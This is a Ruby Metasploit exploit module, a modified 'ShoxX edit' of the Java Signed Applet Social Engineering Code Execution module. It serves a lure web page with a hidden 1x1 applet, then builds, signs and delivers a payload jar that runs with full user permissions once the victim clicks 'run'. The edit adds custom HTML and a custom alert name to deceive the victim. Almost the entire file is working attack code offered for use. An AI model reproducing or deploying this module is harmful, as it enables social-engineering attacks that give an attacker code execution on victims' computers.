##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'rex'
require 'rex/zip'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize( info = {} )
    super( update_info( info,
      'Name'          => 'Java Signed Applet Social Engineering Code Execution',
      'Description'   => %q{
          This exploit dynamically creates a .jar file via the
        Msf::Exploit::Java mixin, then signs the it.  The resulting
        signed applet is presented to the victim via a web page with
        an applet tag.  The victim's JVM will pop a dialog asking if
        they trust the signed applet.

        On older versions the dialog will display the value of CERTCN
        in the "Publisher" line.  Newer JVMs display "UNKNOWN" when the
        signature is not trusted (i.e., it's not signed by a trusted
        CA).  The SigningCert option allows you to provide a trusted
        code signing cert, the values in which will override CERTCN.
        If SigningCert is not given, a randomly generated self-signed
        cert will be used.

        Either way, once the user clicks "run", the applet executes
        with full user permissions.
        
        In this ShoxX Edit, you can now use your own html code.
        You can also enter the name of the Java application you want the victime to show
        
        More indication on www.shoxx-website.com
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'natron - ShoxX edit' ],
      'References'    =>
        [
          [ 'URL', 'http://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-valsmith-metaphish.pdf' ],
          # list of trusted Certificate Authorities by java version
          [ 'URL', 'http://www.spikezilla-software.com/blog/?p=21' ]
        ],
      'Platform'      => [ 'java', 'win', 'osx', 'linux', 'solaris' ],
      'Payload'       => { 'BadChars' => '', 'DisableNops' => true },
      'Targets'       =>
        [
          [ 'Generic (Java Payload)',
            {
              'Platform' => ['java'],
              'Arch' => ARCH_JAVA
            }
          ],
          [ 'Windows x86 (Native Payload)',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Linux x86 (Native Payload)',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Mac OS X PPC (Native Payload)',
            {
              'Platform' => 'osx',
              'Arch' => ARCH_PPC,
            }
          ],
          [ 'Mac OS X x86 (Native Payload)',
            {
              'Platform' => 'osx',
              'Arch' => ARCH_X86,
            }
          ]
        ],
      'DefaultTarget'  => 1,
      'DisclosureDate' => 'Feb 19 1997'
    ))

    register_options( [
      OptString.new('CERTCN', [ true,
        "The CN= value for the certificate. Cannot contain ',' or '/'",
        "SiteLoader"
        ]),
      OptString.new('APPLETNAME', [ true,
        "The main applet's class name.",
        "SiteLoader"
        ]),
      OptPath.new('SigningCert', [ false,
        "Path to a signing certificate in PEM or PKCS12 (.pfx) format"
        ]),
      OptPath.new('SigningKey', [ false,
        "Path to a signing key in PEM format"
        ]),
      OptString.new('SigningKeyPass', [ false,
        "Password for signing key (required if SigningCert is a .pfx)"
        ]),
      OptString.new('Name', [ true,
        "The name of the java alert. Default is Metasploit.Payload","Metasploit.Payload"
        ]),
      OptPath.new('HTML_FILE', [ true,
        "Emplacement of hmtl file","Default"]),
    ], self.class)
  end


  def setup
    load_cert
    load_applet_class
    super
  end


  def on_request_uri( cli, request )
    if not request.uri.match(/\.jar$/i)
      if not request.uri.match(/\/$/)
        send_redirect( cli, get_resource() + '/', '')
        return
      end

      print_status( "Handling request" )

      send_response_html( cli, generate_html, { 'Content-Type' => 'text/html' } )
      return
    end

    p = regenerate_payload(cli)
    if not p
      print_error("Failed to generate the payload.")
      # Send them a 404 so the browser doesn't hang waiting for data
      # that will never come.
      send_not_found(cli)
      return
    end

    # If we haven't returned yet, then this is a request for our applet
    # jar, build one for this victim.
    jar = p.encoded_jar

    jar.add_file("#{datastore["APPLETNAME"]}.class", @applet_class)

    jar.build_manifest(:main_class => datastore["Name"])

    jar.sign(@key, @cert, @ca_certs)
    #File.open("payload.jar", "wb") { |f| f.write(jar.to_s) }

    print_status("Sending #{datastore['APPLETNAME']}.jar. Waiting for user to click 'accept'...")
    send_response( cli, jar.to_s, { 'Content-Type' => "application/octet-stream" } )

    handler( cli )

  end


  def load_applet_class
    data_dir = File.join(Msf::Config.data_directory, "exploits", self.shortname)
    if datastore["APPLETNAME"]
      unless datastore["APPLETNAME"] =~ /^[a-zA-Z_$]+[a-zA-Z0-9_$]*$/
        fail_with(Exploit::Failure::BadConfig, "APPLETNAME must conform to rules of Java identifiers (alphanum, _ and $, must not start with a number)")
      end
      siteloader = File.open(File.join(data_dir, "SiteLoader.class"), "rb") {|fd| fd.read(fd.stat.size) }
      # Java strings are prefixed with a 2-byte, big endian length
      find_me = ["SiteLoader".length].pack("n") + "SiteLoader"
      idx = siteloader.index(find_me)
      len = [datastore["APPLETNAME"].length].pack("n")
      # Now replace it with the new class name
      siteloader[idx, "SiteLoader".length+2] = len + datastore["APPLETNAME"]
    else
      # Don't need to replace anything, just read it in
      siteloader = File.open(File.join(data_dir, "SiteLoader.class"), "rb") {|fd| fd.read(fd.stat.size) }
    end
    @applet_class = siteloader
  end


  def load_cert
    if datastore["SigningCert"]
      cert_str = File.open(datastore["SigningCert"], "rb") {|fd| fd.read(fd.stat.size) }
      begin
        pfx = OpenSSL::PKCS12.new(cert_str, datastore["SigningKeyPass"])
        @cert = pfx.certificate
        @key  = pfx.key
        @ca_certs = pfx.ca_certs

      rescue OpenSSL::PKCS12::PKCS12Error
        # it wasn't pkcs12, try it as concatenated PEMs
        certs = cert_str.scan(/-+BEGIN CERTIFICATE.*?END CERTIFICATE-+/m)
        @cert = OpenSSL::X509::Certificate.new(certs.shift)
        @ca_certs = nil
        while certs.length > 0
          @ca_certs ||= []
          @ca_certs << OpenSSL::X509::Certificate.new(certs.shift)
        end

        if datastore["SigningKey"] and File.file?(datastore["SigningKey"])
          key_str = File.open(datastore["SigningKey"], "rb") {|fd| fd.read(fd.stat.size) }
        else
          key_str = cert_str
        end

        # First try it as RSA and fallback to DSA if that doesn't work
        begin
          @key = OpenSSL::PKey::RSA.new(cert_str, datastore["SigningKeyPass"])
        rescue OpenSSL::PKey::RSAError => e
          @key = OpenSSL::PKey::DSA.new(cert_str, datastore["SigningKeyPass"])
        end
      end
    else
      # Name.parse uses a simple regex that isn't smart enough to allow
      # slashes or commas in values, just remove them.
      certcn = datastore["CERTCN"].gsub(%r|[/,]|, "")
      x509_name = OpenSSL::X509::Name.parse(
        "C=Unknown/ST=Unknown/L=Unknown/O=Unknown/OU=Unknown/CN=#{certcn}"
        )

      @key  = OpenSSL::PKey::DSA.new(1024)
      @cert = OpenSSL::X509::Certificate.new
      @cert.version = 2
      @cert.serial = 1
      @cert.subject = x509_name
      @cert.issuer = x509_name
      @cert.public_key = @key.public_key
      @cert.not_before = Time.now
      @cert.not_after = @cert.not_before + 3600*24*365*3 # 3 years
    end
  end


  def generate_html
    if (datastore["HTML_FILE"]!="Default")
      html = File.read(datastore["HTML_FILE"])
    end
    if (datastore["HTML_FILE"]=="Default")
      html = %Q|<html><head><title>Loading, Please Wait...</title></head>\n|
      html << %Q|<body><center><p>Loading, Please Wait...</p></center>\n|
    end
      html << %Q|<applet archive="#{get_resource.sub(%r|/$|, '')}/#{datastore["APPLETNAME"]}.jar"\n|
      vprint_line(html)
    if @use_static
      html << %Q|  code="SiteLoader" width="1" height="1">\n|
    else
      html << %Q|  code="#{datastore["APPLETNAME"]}" width="1" height="1">\n|
    end
    html << %Q|</applet>\n</body></html>|
    return html
  end


  # Currently unused until we ship a java compiler of some sort
  def applet_code
    applet = <<-EOS
import java.applet.*;
import metasploit.*;

public class #{datastore["APPLETNAME"]} extends Applet {
  public void init() {
    try {
      Payload.main(null);
    } catch (Exception ex) {
      //ex.printStackTrace();
    }
  }
}
EOS
  end
end

=begin

The following stores a bunch of intermediate files on the path to creating the signature.  The
ImportKey class used for testing was obtained from:
http://www.agentbob.info/agentbob/79-AB.html

  system("rm -rf signed_jar/*")
  File.open("signed_jar/cert.pem", "wb")     { |f| f.write(@cert.to_s + @key.to_s) }
  File.open("signed_jar/key.pem",  "wb")     { |f| f.write(@key.to_s  + @key.public_key.to_s) }
  File.open("signed_jar/unsigned.jar", "wb") { |f| f.write jar.to_s }

  File.open("signed_jar/jarsigner-signed.jar", "wb") { |f| f.write jar.to_s }
  system("openssl x509 -in signed_jar/cert.pem -inform PEM -out signed_jar/cert.der -outform DER")
  system("openssl pkcs8 -topk8 -nocrypt -in signed_jar/key.pem -inform PEM -out signed_jar/key.der -outform DER")
  system("java -cp . ImportKey signed_jar/key.der signed_jar/cert.der")
  system("mv ~/keystore.ImportKey ~/.keystore")
  system("jarsigner -storepass importkey signed_jar/jarsigner-signed.jar importkey")

  jar.sign(@key, @cert)
  File.open("signed_jar/signed.jar", "wb")   { |f| f.write jar.to_s }

=end
